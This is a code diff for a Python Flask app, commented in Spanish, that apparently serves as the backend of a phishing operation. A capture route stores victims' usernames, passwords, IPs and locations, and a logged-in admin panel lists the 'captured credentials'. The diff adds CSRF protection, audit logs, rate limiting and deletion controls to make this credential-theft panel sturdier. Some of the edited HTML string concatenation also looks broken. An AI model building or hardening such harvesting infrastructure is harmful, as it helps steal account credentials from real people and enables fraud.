@@ -8,6 +8,7 @@ import re
 import logging
 from datetime import datetime, timedelta
 from flask import Flask, request, render_template_string, redirect, jsonify, abort, session
+from flask_wtf.csrf import CSRFProtect
 
 # Configurar logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -24,6 +25,9 @@ app.config.update(
     PERMANENT_SESSION_LIFETIME=timedelta(hours=2)  # Sesión expira en 2 horas
 )
 
+# Configurar CSRF
+csrf = CSRFProtect(app)
+
 # Config
 CONFIG = {
     'discord_webhook': None,
@@ -37,8 +41,50 @@ CONFIG = {
     'cleanup_days': 30  # Días para eliminar credenciales antiguas
 }
 
-# Almacenar intentos de login por IP (con timestamp para bloqueo temporal)
+# Diccionarios para rate limiting
 login_attempts = {}
+view_requests = {}
+
+# Habilitar auditoría
+audit_log_enabled = True
+
+def audit_log(action, details, ip=None):
+    """Registra acciones importantes en un archivo de auditoría"""
+    if not audit_log_enabled:
+        return
+    
+    if ip is None:
+        ip = get_client_ip()
+    
+    log_entry = {
+        'timestamp': datetime.now().isoformat(),
+        'action': action,
+        'ip': ip,
+        'details': details,
+        'authenticated': session.get('admin_logged', False)
+    }
+    
+    try:
+        with open('audit.log', 'a') as f:
+            f.write(json.dumps(log_entry) + '\n')
+    except Exception as e:
+        logger.error(f"Error en audit log: {e}")
+
+def is_rate_limited(ip, storage, limit=10, window_seconds=60):
+    """Verifica rate limiting"""
+    now = datetime.now()
+    
+    if ip in storage:
+        count, timestamp = storage[ip]
+        if (now - timestamp).total_seconds() < window_seconds:
+            if count >= limit:
+                return True
+            storage[ip] = (count + 1, timestamp)
+        else:
+            storage[ip] = (1, now)
+    else:
+        storage[ip] = (1, now)
+    return False
 
 def is_ip_blocked(ip):
     """Verifica si una IP está bloqueada y si ya pasó el tiempo de bloqueo"""
@@ -345,6 +391,7 @@ def capture():
     # Validar entrada para prevenir inyecciones
     if not validate_input(username):
         logger.warning(f"Intento de inyección detectado desde {ip}")
+        audit_log('INJECTION_ATTEMPT', {'username': username, 'ip': ip}, ip)
         username = re.sub(r'[^a-zA-Z0-9@.\-_\s]', '', username)
     
     hash_str = hashlib.md5(f"{ip}:{username}:{password}".encode()).hexdigest()
@@ -371,6 +418,7 @@ def capture():
         conn.commit()
         conn.close()
         logger.info(f"Nueva credencial capturada: {username} desde {ip}")
+        audit_log('NEW_CREDENTIAL', {'username': username, 'ip': ip}, ip)
     except Exception as e:
         logger.error(f"Error al guardar credencial: {e}")
     
@@ -384,6 +432,7 @@ def login_credenciales():
     
     # Verificar si la IP está bloqueada (con tiempo de expiración)
     if is_ip_blocked(ip):
+        audit_log('LOGIN_BLOCKED', {'ip': ip}, ip)
         return render_template_string('''
         <!DOCTYPE html>
         <html>
@@ -413,6 +462,7 @@ def login_credenciales():
             session['admin_logged'] = True
             session.permanent = True
             logger.info(f"Login exitoso desde IP {ip}")
+            audit_log('LOGIN_SUCCESS', {'ip': ip}, ip)
             return redirect('/ver-credenciales')
         else:
             # Incrementar intentos fallidos con timestamp
@@ -422,6 +472,7 @@ def login_credenciales():
             login_attempts[ip][1] = datetime.now()
             remaining = max_attempts - login_attempts[ip][0]
             logger.warning(f"Login fallido desde IP {ip}, intentos: {login_attempts[ip][0]}")
+            audit_log('LOGIN_FAILURE', {'ip': ip, 'attempts': login_attempts[ip][0]}, ip)
             
             return render_template_string('''
             <!DOCTYPE html>
@@ -482,23 +533,61 @@ def ver_credenciales():
     if not session.get('admin_logged'):
         return redirect('/login-credenciales')
     
-    # Obtener filtros de la URL
-    filter_ip = request.args.get('ip', '')
-    filter_username = request.args.get('username', '')
-    filter_location = request.args.get('location', '')
+    ip = get_client_ip()
     
+    # Rate limiting para vistas (10 por minuto)
+    if is_rate_limited(ip, view_requests, limit=10, window_seconds=60):
+        logger.warning(f"Rate limit excedido desde IP {ip} en /ver-credenciales")
+        audit_log('RATE_LIMIT_VIEWS', {'ip': ip}, ip)
+        return render_template_string('''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Límite alcanzado</title>
+            <style>
+                body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+                .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>⏳ Demasiadas peticiones</h1>
+                <p>Espera 1 minuto antes de volver a intentarlo.</p>
+            </div>
+        </body>
+        </html>
+        ''', 429
+    
+    # Sanitizar filtros
+    allowed_params = ['ip', 'username', 'location']
+    filters = {}
+    
+    for param in allowed_params:
+        value = request.args.get(param, '').strip()
+        if value:
+            if len(value) > 50:
+                continue
+            if re.match(r'^[a-zA-Z0-9@.\-_\s]+$', value):
+                filters[param] = value
+            else:
+                logger.warning(f"Filtro rechazado: {param}={value}")
+                audit_log('INVALID_FILTER', {'param': param, 'value': value}, ip)
+    
+    audit_log('VIEW_CREDENTIALS', {'filters': filters, 'count': len(filters)}, ip)
+    
+    # Construir consulta con filtros
     query = 'SELECT id, timestamp, ip, username, password, geo_location FROM credentials WHERE 1=1'
     params = []
     
-    if filter_ip:
+    if 'ip' in filters:
         query += ' AND ip LIKE ?'
-        params.append(f'%{filter_ip}%')
-    if filter_username:
+        params.append(f'%{filters["ip"]}%')
+    if 'username' in filters:
         query += ' AND username LIKE ?'
-        params.append(f'%{filter_username}%')
-    if filter_location:
+        params.append(f'%{filters["username"]}%')
+    if 'location' in filters:
         query += ' AND geo_location LIKE ?'
-        params.append(f'%{filter_location}%')
+        params.append(f'%{filters["location"]}%')
     
     query += ' ORDER BY id DESC'
     
@@ -546,13 +635,13 @@ def ver_credenciales():
             <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
         </div>
         <h1>🔐 Credenciales Capturadas</h1>
-        <p style="text-align:center; color:#666;">Total: <strong>"""+str(len(rows))+"""</strong></p>
+        <p style="text-align:center; color:#666;">Total: <strong>""" + str(len(rows)) + """</strong></p>
         
         <div class="filters">
             <form method="GET" style="display: flex; flex-wrap: wrap; align-items: center; gap: 10px;">
-                <input type="text" name="ip" placeholder="Filtrar por IP" value="""+request.args.get('ip', '')+""">
-                <input type="text" name="username" placeholder="Filtrar por usuario" value="""+request.args.get('username', '')+""">
-                <input type="text" name="location" placeholder="Filtrar por ubicación" value="""+request.args.get('location', '')+""">
+                <input type="text" name="ip" placeholder="Filtrar por IP" value="""" + request.args.get('ip', '') + """">
+                <input type="text" name="username" placeholder="Filtrar por usuario" value="""" + request.args.get('username', '') + """">
+                <input type="text" name="location" placeholder="Filtrar por ubicación" value="""" + request.args.get('location', '') + """">
                 <button type="submit">🔍 Filtrar</button>
                 <a href="/ver-credenciales" class="clear" style="padding: 8px 16px; background: #6c757d; color: white; border: none; border-radius: 4px; text-decoration: none;">❌ Limpiar</a>
             </form>
@@ -582,7 +671,8 @@ def ver_credenciales():
                 <td>
                     <form action="/api/credentials/{r[0]}" method="POST" style="display:inline;">
                         <input type="hidden" name="_method" value="DELETE">
-                        <button type="submit" class="delete-btn" onclick="return confirm('¿Eliminar esta credencial?')">🗑️</button>
+                        <input type="hidden" name="confirm" value="true">
+                        <button type="submit" class="delete-btn" onclick="return confirm('¿Eliminar esta credencial? Esta acción es irreversible.')">🗑️</button>
                     </form>
                 </td>
             </tr>
@@ -591,7 +681,7 @@ def ver_credenciales():
     html += """
         </table>
         <p style="text-align:center; margin-top:20px; color:#999; font-size:14px;">
-            Actualizado: """+datetime.now().strftime('%Y-%m-%d %H:%M:%S')+"""
+            Actualizado: """ + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + """
         </p>
     </body>
     </html>
@@ -602,20 +692,36 @@ def ver_credenciales():
 def delete_credential(credential_id):
     """Eliminar una credencial específica"""
     if not session.get('admin_logged'):
+        audit_log('UNAUTHORIZED_DELETE', {'credential_id': credential_id})
         return jsonify({'error': 'No autorizado'}), 401
+    
+    ip = get_client_ip()
+    
+    # Verificar confirmación
+    if request.method == 'POST' and request.form.get('confirm') != 'true':
+        return jsonify({'error': 'Se requiere confirmación'}), 400
+    
+    # Límite de eliminaciones por sesión (20)
+    session.setdefault('delete_count', 0)
+    if session.get('delete_count', 0) >= 20:
+        audit_log('DELETE_LIMIT_EXCEEDED', {'credential_id': credential_id}, ip)
+        return jsonify({'error': 'Límite de eliminaciones alcanzado'}), 429
     
     try:
         conn = sqlite3.connect('credentials.db', check_same_thread=False)
         cursor = conn.cursor()
         cursor.execute('DELETE FROM credentials WHERE id = ?', (credential_id,))
-        conn.commit()
         deleted = cursor.rowcount
+        conn.commit()
         conn.close()
         
         if deleted:
-            logger.info(f"Credencial {credential_id} eliminada")
+            session['delete_count'] = session.get('delete_count', 0) + 1
+            logger.info(f"Credencial {credential_id} eliminada desde IP {ip}")
+            audit_log('DELETE_CREDENTIAL', {'credential_id': credential_id, 'success': True}, ip)
             return jsonify({'success': True, 'message': 'Credencial eliminada'})
         else:
+            audit_log('DELETE_CREDENTIAL', {'credential_id': credential_id, 'success': False}, ip)
             return jsonify({'success': False, 'message': 'Credencial no encontrada'}), 404
     except Exception as e:
         logger.error(f"Error al eliminar credencial: {e}")
@@ -625,6 +731,7 @@ def delete_credential(credential_id):
 def logout_credenciales():
     session.pop('admin_logged', None)
     logger.info("Sesión cerrada")
+    audit_log('LOGOUT', {})
     return redirect('/login-credenciales')
 
 @app.route('/api/credentials')
@@ -632,6 +739,7 @@ def api_credentials():
     key = request.headers.get('X-API-Key')
     if key != CONFIG.get('api_key'):
         logger.warning(f"Intento de acceso no autorizado a /api/credentials desde {request.remote_addr}")
+        audit_log('UNAUTHORIZED_API_ACCESS', {'endpoint': '/api/credentials'})
         abort(401)
     
     try:
@@ -643,6 +751,7 @@ def api_credentials():
         conn.commit()
         conn.close()
         logger.info("API /credentials consultada exitosamente")
+        audit_log('API_CREDENTIALS_ACCESS', {'count': len(rows)})
     except Exception as e:
         logger.error(f"Error en API /credentials: {e}")
         return jsonify({'error': 'Error interno'}), 500
@@ -657,6 +766,7 @@ def stats():
     key = request.headers.get('X-API-Key')
     if key != CONFIG.get('api_key'):
         logger.warning(f"Intento de acceso no autorizado a /api/stats desde {request.remote_addr}")
+        audit_log('UNAUTHORIZED_API_ACCESS', {'endpoint': '/api/stats'})
         abort(401)
     
     try:
@@ -666,6 +776,7 @@ def stats():
         total, unique, new = cursor.fetchone()
         conn.close()
         logger.info("API /stats consultada exitosamente")
+        audit_log('API_STATS_ACCESS', {'total': total, 'unique': unique, 'new': new})
     except Exception as e:
         logger.error(f"Error en API /stats: {e}")
         return jsonify({'error': 'Error interno'}), 500
@@ -677,10 +788,25 @@ def api_cleanup():
     """Endpoint para limpieza manual de credenciales antiguas"""
     key = request.headers.get('X-API-Key')
     if key != CONFIG.get('api_key'):
+        audit_log('UNAUTHORIZED_CLEANUP', {'ip': get_client_ip()})
         abort(401)
     
+    ip = get_client_ip()
     days = request.args.get('days', CONFIG.get('cleanup_days', 30), type=int)
+    
+    # Validar días
+    if days < 1:
+        return jsonify({'error': 'Los días deben ser al menos 1'}), 400
+    if days > 365:
+        return jsonify({'error': 'Máximo 365 días permitidos'}), 400
+    
+    # Límite de operaciones (prevenir sobrecarga)
+    if get_credentials_count() > 10000:
+        return jsonify({'error': 'Demasiadas credenciales. Usa eliminación manual.'}), 400
+    
     deleted = cleanup_old_credentials(days)
+    audit_log('CLEANUP_CREDENTIALS', {'days': days, 'deleted': deleted}, ip)
+    
     return jsonify({
         'deleted': deleted,
         'message': f'Eliminadas {deleted} credenciales con más de {days} días',
